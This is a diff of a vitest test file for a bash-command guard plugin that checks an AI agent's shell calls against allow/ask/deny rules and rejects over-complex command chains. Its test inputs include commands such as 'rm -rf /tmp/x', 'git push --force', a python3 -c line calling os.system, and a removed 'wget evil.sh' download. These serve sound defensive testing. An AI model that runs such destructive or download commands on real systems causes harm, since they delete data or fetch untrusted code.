@@ -1,6 +1,8 @@
 import { describe, it, expect, beforeEach } from "vitest";
-import { resolveSegment, resolveChain, beforeExecute, handlePermissionAsk, clearStoredDecision, isComplexChain, buildReadabilityMessage } from "../enforce.js";
+import { resolveSegment, resolveChain, beforeExecute, handlePermissionAsk, clearStoredDecision, checkComplexity, buildRejectionMessage } from "../enforce.js";
 import type { PluginConfig } from "../config.js";
+import type { RestructureConfig } from "../plugin-config.js";
+import { parseChain } from "../chain.js";
 import type { ChainSegment } from "../chain.js";
 
 const defaultConfig: PluginConfig = {
@@ -180,48 +182,107 @@ describe("handlePermissionAsk", () => {
   });
 });
 
-describe("isComplexChain", () => {
-  it("returns true for pipe chain", () => {
-    expect(isComplexChain("cat log.txt | grep error | sort")).toBe(true);
+describe("checkComplexity", () => {
+  const enabled: RestructureConfig = { enabled: true, maxSegments: 3, maxDepth: 2 };
+
+  it("disabled config → never violated", () => {
+    const chain = parseChain("a && b && c && d");
+    expect(checkComplexity("a && b && c && d", chain, { enabled: false, maxSegments: 3, maxDepth: 2 })).toBeNull();
   });
 
-  it("returns true for && chain", () => {
-    expect(isComplexChain("cd src && npm run build && npm test")).toBe(true);
+  it("boundary: N == max passes, N+1 throws", () => {
+    expect(checkComplexity("a && b && c", parseChain("a && b && c"), enabled)).toBeNull();
+    expect(checkComplexity("a && b && c && d", parseChain("a && b && c && d"), enabled)).toEqual({
+      kind: "segments",
+      segmentCount: 4,
+    });
   });
 
-  it("returns false for single command", () => {
-    expect(isComplexChain("git status")).toBe(false);
+  it("boundary: depth N == max passes, N+1 throws", () => {
+    expect(checkComplexity("echo $(whoami)", parseChain("echo $(whoami)"), enabled)).toBeNull();
+    expect(checkComplexity("echo $(echo $(whoami))", parseChain("echo $(echo $(whoami))"), enabled)).toEqual({
+      kind: "depth",
+    });
   });
 
-  it("returns false for single command with arguments", () => {
-    expect(isComplexChain("npm run build -- --watch")).toBe(false);
+  it("multi-line: per-line segment limit, one command per line passes", () => {
+    const script = "git status\ngit log\ngit diff\ngit show\necho done";
+    expect(checkComplexity(script, parseChain(script), enabled)).toBeNull();
   });
 
-  it("returns true for semicolon chain", () => {
-    expect(isComplexChain("echo hello; echo world")).toBe(true);
+  it("multi-line: names worst offending line", () => {
+    const script = "a && b && c && d && e\nf && g && h";
+    expect(checkComplexity(script, parseChain(script), enabled)).toEqual({
+      kind: "segments",
+      segmentCount: 5,
+      worstLine: 1,
+    });
   });
 
-  it("returns true for mixed operators", () => {
-    expect(isComplexChain("cd src && cat package.json | grep name")).toBe(true);
+  it("inline-script statement count over threshold is violated", () => {
+    const cmd = `python3 -c "import os; os.system('a'); os.system('b'); os.system('c'); os.system('d')"`;
+    expect(checkComplexity(cmd, parseChain(cmd), enabled)).toEqual({
+      kind: "inline-script",
+      interpreter: "python -c",
+      statementCount: 5,
+    });
   });
 
-  it("returns false for command with nested substitution only", () => {
-    expect(isComplexChain('cat $(find . -name "*.txt")')).toBe(false);
+  it("meta-command body counts toward segments", () => {
+    const cmd = 'bash -c "a && b && c && d"';
+    const violation = checkComplexity(cmd, parseChain(cmd), enabled);
+    expect(violation).not.toBeNull();
+    expect(violation!.kind).toBe("segments");
+  });
+
+  it("simple command passes", () => {
+    expect(checkComplexity("git status", parseChain("git status"), enabled)).toBeNull();
   });
 });
 
-describe("readabilityRejection", () => {
+describe("buildRejectionMessage", () => {
+  const enabled: RestructureConfig = { enabled: true, maxSegments: 3, maxDepth: 2 };
+
+  it("single-line message contains counts and instruction", () => {
+    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
+    const chain = parseChain(cmd);
+    const violation = checkComplexity(cmd, chain, enabled)!;
+    const msg = buildRejectionMessage(violation, chain, cmd);
+    expect(msg).toContain("[opencode-bash-guard]");
+    expect(msg).toContain("4 chained commands");
+    expect(msg).toContain("nesting depth 1");
+    expect(msg).toContain("Re-issue as separate bash tool calls");
+  });
+
+  it("multi-line message names the offending line", () => {
+    const cmd = "a && b && c && d && e\nf && g";
+    const chain = parseChain(cmd);
+    const violation = checkComplexity(cmd, chain, enabled)!;
+    const msg = buildRejectionMessage(violation, chain, cmd);
+    expect(msg).toContain("Complex command rejected (line 1: 5 chained commands");
+  });
+
+  it("inline-script message names interpreter and statements", () => {
+    const cmd = `python3 -c "import os; os.system('a'); os.system('b'); os.system('c'); os.system('d')"`;
+    const chain = parseChain(cmd);
+    const violation = checkComplexity(cmd, chain, enabled)!;
+    const msg = buildRejectionMessage(violation, chain, cmd);
+    expect(msg).toContain("Complex inline script rejected (python -c: 5 statements)");
+    expect(msg).toContain("one statement per line");
+    expect(msg).toContain("move the script to a file");
+  });
+});
+
+describe("restructure enforcement in beforeExecute", () => {
   const askConfig: PluginConfig = {
-    bashRules: [
-      { pattern: "*", action: "ask" },
-    ],
+    bashRules: [{ pattern: "*", action: "ask" }],
     editRules: [],
     externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
-    externalDirectoryDefault: null,
+    externalDirectoryDefault: "ask",
     enabled: true,
   };
 
-  const gitConfig: PluginConfig = {
+  const gitAllowConfig: PluginConfig = {
     bashRules: [
       { pattern: "*", action: "ask" },
       { pattern: "git *", action: "allow" },
@@ -229,74 +290,125 @@ describe("readabilityRejection", () => {
     ],
     editRules: [],
     externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
-    externalDirectoryDefault: null,
+    externalDirectoryDefault: "ask",
     enabled: true,
   };
 
+  const enabled: RestructureConfig = { enabled: true, maxSegments: 3, maxDepth: 2 };
+  const disabled: RestructureConfig = { enabled: false, maxSegments: 3, maxDepth: 2 };
+
   beforeEach(() => {
-    clearStoredDecision("test-readability");
+    clearStoredDecision("restructure-test");
   });
 
-  it("rejects complex chain with readabilityReject=true when action would be ask", () => {
-    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, askConfig);
-    expect(result.readabilityReject).toBe(true);
+  it("allowed complex chain passes — allowed stays allowed", () => {
+    const cmd = "git status && git log && git diff && git show";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    expect(result.chainAction).toBe("allow");
+    expect(result.rejectionMessage).toBeNull();
+    expect(result.shouldWrap).toBe(false);
+  });
+
+  it("complex ask chain rejected with counts and instruction", () => {
+    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    expect(result.rejectionMessage).not.toBeNull();
+    expect(result.rejectionMessage).toContain("4");
+    expect(result.rejectionMessage).toContain("Re-issue as separate bash tool calls");
+    expect(result.shouldWrap).toBe(false);
+  });
+
+  it("rejected ask chain does not store a decision (no dialog follows the throw)", () => {
+    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
+    beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    const output = { status: "ask" as const };
+    handlePermissionAsk({ callID: "restructure-test" }, output);
+    expect(output.status).toBe("ask");
+  });
+
+  it("multi-line one-command-per-line re-issue passes the complexity gate", () => {
+    const cmd = "git status\nrm -rf /tmp/x\necho ok\nls";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, askConfig, enabled);
+    expect(result.rejectionMessage).toBeNull();
+    expect(result.chainAction).toBe("ask");
+    expect(result.shouldWrap).toBe(true);
+  });
+
+  it("2-line script of 5-segment chains rejected naming the line", () => {
+    const cmd = "git a1 && git a2 && git a3 && git a4 && rm -rf /tmp/x\ngit b1 && git b2 && git b3 && git b4 && rm -rf /tmp/y";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, askConfig, enabled);
+    expect(result.rejectionMessage).not.toBeNull();
+    expect(result.rejectionMessage).toContain("line 1: 5 chained commands");
+  });
+
+  it("inline python3 -c with 5 statements throws", () => {
+    const cmd = `git status && python3 -c "import os; os.system('a'); os.system('b'); os.system('c'); os.system('d')"`;
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    expect(result.rejectionMessage).not.toBeNull();
+    expect(result.rejectionMessage).toContain("Complex inline script rejected");
+  });
+
+  it("pretty inline script passes the gate", () => {
+    const cmd = 'git status && python3 -c "import os\nos.system(\'a\')\nos.system(\'b\')"';
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    expect(result.rejectionMessage).toBeNull();
+  });
+
+  it("feature disabled — complex ask chain follows the plain ask flow", () => {
+    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, disabled);
+    expect(result.rejectionMessage).toBeNull();
+    expect(result.chainAction).toBe("ask");
+    expect(result.shouldWrap).toBe(true);
+  });
+
+  it("deny flow unchanged even when limits exceeded", () => {
+    const denyPushConfig: PluginConfig = {
+      bashRules: [
+        { pattern: "*", action: "ask" },
+        { pattern: "git *", action: "allow" },
+        { pattern: "git push *", action: "deny" },
+      ],
+      editRules: [],
+      externalDirectoryRules: [{ pattern: "./**", action: "allow" }],
+      externalDirectoryDefault: "ask",
+      enabled: true,
+    };
+    const cmd = "git push --force && git status && git log && git show";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, denyPushConfig, enabled);
+    expect(result.rejectionMessage).toBeNull();
     expect(result.chainAction).toBe("deny");
     expect(result.shouldWrap).toBe(true);
   });
 
-  it("rejects mixed chain with readabilityReject=true when one segment triggers ask", () => {
-    const result = beforeExecute("Bash", "test-readability", "/project", { command: "npm install good && wget evil.sh" }, gitConfig);
-    expect(result.readabilityReject).toBe(true);
-    expect(result.chainAction).toBe("deny");
-  });
-
-  it("stores deny decision for readability-rejected command", () => {
-    beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, askConfig);
-    const output = { status: "ask" as const };
-    handlePermissionAsk({ callID: "test-readability" }, output);
-    expect(output.status).toBe("deny");
-  });
-
-  it("does not reject single command that needs ask", () => {
-    const result = beforeExecute("Bash", "test-readability", "/project", { command: "wget evil.sh" }, gitConfig);
-    expect(result.readabilityReject).toBe(false);
-    expect(result.chainAction).toBe("ask");
-  });
-
-  it("does not reject complex chain when all segments are denied anyway", () => {
-    const denyConfig: PluginConfig = {
-      bashRules: [{ pattern: "*", action: "deny" }],
+  it("no-opinion chain unchanged even when limits exceeded", () => {
+    const noRules: PluginConfig = {
+      bashRules: [],
       editRules: [],
       externalDirectoryRules: [],
       externalDirectoryDefault: null,
       enabled: true,
     };
-    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo hi && echo there" }, denyConfig);
-    expect(result.readabilityReject).toBe(false);
+    const cmd = "a && b && c && d";
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, noRules, enabled);
+    expect(result.rejectionMessage).toBeNull();
+    expect(result.chainAction).toBeNull();
+    expect(result.shouldWrap).toBe(false);
+  });
+
+  it("parse error unchanged — fail-closed deny", () => {
+    const cmd = 'echo "unbalanced';
+    const result = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, askConfig, enabled);
+    expect(result.rejectionMessage).toBeNull();
     expect(result.chainAction).toBe("deny");
   });
 
-  it("does not reject when command is parse error", () => {
-    const result = beforeExecute("Bash", "test-readability", "/project", { command: "echo \"hello" }, askConfig);
-    expect(result.readabilityReject).toBe(false);
-    expect(result.chainAction).toBe("deny");
-  });
-});
-
-describe("buildReadabilityMessage", () => {
-  it("includes the original command in the message", () => {
-    const msg = buildReadabilityMessage("echo hi && echo there");
-    expect(msg).toContain("echo hi && echo there");
-  });
-
-  it("starts with a heredoc", () => {
-    const msg = buildReadabilityMessage("echo hi && echo there");
-    expect(msg).toContain("OPENGUARD");
-  });
-
-  it("ends with exit 1", () => {
-    const msg = buildReadabilityMessage("echo hi && echo there");
-    expect(msg).toContain("exit 1");
+  it("repeated violation re-throws with the same message (no counter)", () => {
+    const cmd = "git status && rm -rf /tmp/x && echo ok && ls";
+    const first = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    const second = beforeExecute("Bash", "restructure-test", "/project", { command: cmd }, gitAllowConfig, enabled);
+    expect(second.rejectionMessage).toBe(first.rejectionMessage);
+    expect(second.rejectionMessage).not.toBeNull();
   });
 });
 
